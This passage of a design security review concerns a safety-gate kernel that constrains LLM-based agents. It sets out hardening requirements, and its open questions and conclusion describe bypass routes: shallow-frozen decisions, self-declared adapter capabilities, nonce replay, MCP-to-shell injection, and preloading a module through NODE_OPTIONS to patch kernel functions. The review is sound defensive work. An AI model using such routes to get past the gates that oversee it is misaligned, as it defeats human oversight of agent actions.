- `Object.freeze()` is insufficient. Use `deepFreeze()` (recursive freeze of all nested objects and arrays).
- The kernel must pass a DEEP CLONE to adapters, not the original object reference.
- Post-adapter validation must compare adapter output against the kernel's original (pre-clone) decision, not the clone.

#### KR-2: Kernel-Defined Floors
- Each numeric or array-valued policy setting must have a kernel-hard-coded floor (minimum/maximum).
- `policy.mjs` must reject any configuration value outside kernel-defined bounds → `RED_BLOCK: POLICY_WEAKENS_KERNEL_GATE`.
- Kernel floors are defined in `kernel.mjs` and are themselves immutable.

#### KR-3: Capability Validation
- Adapters must never self-declare safety-critical capabilities without validation.
- `validate()` must produce demonstrable evidence for each claimed capability.
- Critical safety checks (path validation, secret detection, Docker binding) are ALWAYS performed by the kernel, never delegated to adapters.

#### KR-4: Nonce Ledger Integrity
- The consumed-nonce ledger must be an append-only log with cryptographic chaining (each entry hashes the previous entry).
- The ledger must be stored within the project boundary with path-safety protection.
- Ledger integrity is verified before any approval is consumed.

#### KR-5: Minimum Verification Levels
- Each kernel gate must declare its minimum required verification level.
- The decision contract builder must reject decisions where verification is below the required minimum.
- Safety-critical gates (path safety, Docker binding, secret detection) require at minimum `CLI_PASS` or `LIVE_INTEGRATION_PASS` — never `STRUCTURAL_PASS`.

#### KR-6: Handoff Manifest Signing
- Every handoff manifest must be signed with HMAC-SHA256 using a kernel-derived key.
- Every handoff manifest must include a sequence number.
- Every handoff manifest must include a hash of the previous manifest.

#### KR-7: Import Graph Validation
- `kernel.mjs` must have a build-time check that verifies zero imports from non-`node:` modules.
- A runtime check at module load time must assert kernel purity.

#### KR-8: Path Resolution Order
- Path-safety gates (`NO_PATH_ESCAPE`, `NO_SYMLINK_ESCAPE`) must run BEFORE scope validation gates (`NO_CROSS_SCOPE_APPROVAL`, `NO_UNRELATED_WORKTREE_WRITE`).
- All paths must be resolved to canonical form via `fs.realpathSync()` before any gate comparison.
- Unicode normalization to NFC before path comparison.

#### KR-9: Evidence Independence
- `normalizeEvidence()` must not add fields absent from raw input.
- For any safety-critical evidence claim, the kernel must independently verify at least one artifact.
- Adapter-fabricated evidence must be structurally detectable.

#### KR-10: Decision Contract Signing
- Every gate decision contract must carry an HMAC-SHA256 signature.
- Consumers must verify the signature before trusting the contract.
- Use deterministic JSON serialization before signing.

### 5.2 Defense-in-Depth Measures

These are **recommended** additional safeguards beyond the mandatory requirements:

- **Separate process for AGPL content scanning.** If Odysseus file reading is unavoidable, spawn a child process with memory isolation.
- **Entropy-based secret detection.** Supplement pattern matching with Shannon entropy analysis.
- **MCP response sanitization.** Strip shell metacharacters from MCP responses before consumption by bash tools.
- **Memory entry TTL.** Agent memory entries expire after a configurable duration.
- **CLI parameter strict validation.** Use argument arrays, never string concatenation for shell commands.
- **File watcher for config changes.** Monitor config files for runtime modifications; re-validate gates on change.
- **Permission precedence alignment.** The OpenCode adapter must replicate the exact permission resolution order of the runtime it adapts to.

---

## 6. Open Questions

These questions cannot be answered at design time and require implementation-phase decisions or runtime-environment validation:

| # | Question | Why Design-Time Cannot Answer |
|---|----------|-------------------------------|
| Q1 | **Can the consumed-nonce ledger be stored in a database with strong integrity guarantees, or must it be a local file?** | Depends on deployment environment. A database provides better integrity but adds a dependency. |
| Q2 | **How will the kernel handle concurrent operations from multiple agents?** | The design assumes single-agent operation. Concurrent gate evaluation could race on the shared nonce ledger. |
| Q3 | **What happens when the kernel cannot determine the runtime identity (all detection signals absent or ambiguous)?** | The Generic adapter is the fallback, but its safety guarantees are minimal. Should this be `RED_BLOCK` for safety-critical operations? |
| Q4 | **Can the kernel operate without Node.js?** | The kernel is written in JavaScript (`.mjs`). If Node.js is not available, no kernel gates run. Is this acceptable? Should there be a compiled/binary fallback? |
| Q5 | **How are kernel gate violations reported to a human reviewer?** | The decision contract is machine-readable, but what is the human-facing interface? CLI output? Structured report? Notification system? |
| Q6 | **Is the AGPL boundary strategy legally sufficient?** | This is a legal question, not a technical one. External legal review is required before implementation. |
| Q7 | **What is the performance budget for gate evaluation?** | 19 kernel gates + policy gates + project gates, each potentially executing filesystem operations. What is the acceptable latency per operation before memoization? |
| Q8 | **How does the kernel validate that an adapter's `validate()` method actually ran?** | The adapter controls its own `validate()` implementation. The kernel can check the output but cannot verify that the validation logic was actually executed vs. returning a hard-coded result. |
| Q9 | **What is the upgrade path for kernel gates?** | If a new gate is added (going from 19 to 20), how does the kernel version itself? How do existing projects migrate? |
| Q10 | **Can the kernel be bypassed by setting `NODE_OPTIONS` or `--require` flags?** | Node.js allows preloading modules via `NODE_OPTIONS=--require ./bypass.mjs`. A malicious user could preload a module that patches kernel functions before they run. |

---

## 7. Conclusion

The Runtime-Neutral Hard Gate Kernel is a **well-motivated architecture** that addresses a real gap in the ecosystem: the absence of structural, runtime-independent enforcement of safety invariants. The three-layer design (kernel → policy → project) and the adapter contract are sound approaches.

However, the design contains **critical vulnerabilities** that must be addressed in the implementation phase:

1. **Shallow freeze** (V-OVERRIDE-001) is the most immediate concern — it completely defeats the NO_RUNTIME_ADAPTER_OVERRIDE meta-gate.
2. **Self-declared capabilities** (V-VECTOR-001) create a trust relationship between kernel and adapter that the kernel's own design goals prohibit.
3. **Semantic weakening via policy** (V-VECTOR-002) means the "kernel gates are never configurable" claim is not structurally true without kernel-defined floors.
4. **The nonce ledger's integrity** (V-APPROVAL-001) is unspecified, making approval replay possible.
5. **The Docker binding check** (V-ODY-001) could be purely structural, missing the most dangerous exposure in the entire design.

The 10 mandatory hardening requirements (KR-1 through KR-10) in Section 5 provide a concrete path to closing these vulnerabilities during implementation. The architecture is salvageable — no fundamental redesign is needed — but the implementation must address every vulnerability identified in this review.

### Recommendation

**Proceed with implementation** of the gate kernel, **conditional on**:
1. All 10 kernel hardening requirements (KR-1 through KR-10) being satisfied in the implementation
2. All 4 CRITICAL severity findings being structurally mitigated (not documented-around)
3. All 11 HIGH severity findings being addressed before the kernel is used in any non-experimental context
4. A legal review of the AGPL boundary strategy before the Odysseus adapter reads any file content
5. A follow-up security review of the implemented code (not just the design)

**Risk if unmitigated:** The kernel provides a false sense of security — it appears to enforce invariant gates, but all four CRITICAL vulnerabilities allow complete bypass by a malicious adapter or an attacker with filesystem access. Without the hardening requirements, the kernel is security theater.

---

## Appendix A: Design Strengths

For balance, this review acknowledges the design's strengths:

1. **Three-layer architecture** correctly separates invariant enforcement (kernel), configurable policy (risk-tier), and project-local customization (project gates).
2. **The 19 kernel gate invariants** are well-chosen — each addresses a real safety property that must be guaranteed regardless of runtime.
3. **Approval receipt model** (scope-bound, single-use via nonce, expiry) is correctly designed — the approval security properties are sound in concept.
4. **Gate Decision Contract** as machine-readable JSON is excellent for auditability and cross-runtime handoff.
5. **AGPL boundary awareness** is forward-thinking — the Odysseus case is correctly identified as requiring structural, not just policy-level, protection.
6. **Adapter contract clarity** — the 8-method interface and the may-never-weaken rule are clearly specified.
7. **The NO_RUNTIME_ADAPTER_OVERRIDE meta-gate** is a critical insight — protecting the protection mechanism itself.
8. **Evidence-gated classification** (NO_FALSE_GREEN, NO_FAKE_EXECUTION) directly addresses the hallucination vulnerability of LLM-based agents.

The design has strong foundations. The vulnerabilities identified in this review are in the **enforcement mechanisms**, not in the architectural vision. With the hardening requirements applied during implementation, the gate kernel can fulfill its design intent.

---

## Appendix B: CVSS 3.1 Justification Notes

All CVSS vectors in this report use the following baseline assumptions consistent with the project environment:

- **Attack Vector (AV):** Local (L) for most vectors — the attacker needs filesystem access to the project directory. Network (N) for MCP-to-shell and Docker binding vectors.
- **Attack Complexity (AC):** Low (L) when the attack requires only file writes or standard tool usage. High (H) when the attack requires timing, race conditions, or cryptographic collision.
- **Privileges Required (PR):** None (N) — the attacker is modeled as a process with project-directory filesystem access (no root, no special capabilities).
- **User Interaction (UI):** None (N) — the attack does not require a human to take any action.
- **Scope (S):** Changed (C) for vectors that allow escape from the project boundary (path escape, container escape, AGPL boundary crossing, MCP injection). Unchanged (U) for vectors within the project boundary.
- **Confidentiality (C), Integrity (I), Availability (A):** High (H) when the attack enables arbitrary read/write/execute; Low (L) when the impact is limited to metadata or configuration.

**These vectors are calculated for the design flaws, not for any existing implementation. They represent the worst-case impact IF the design flaw were present in an implemented system.** Actual CVSS scores for the implemented kernel may differ.

---

*End of Security Review*
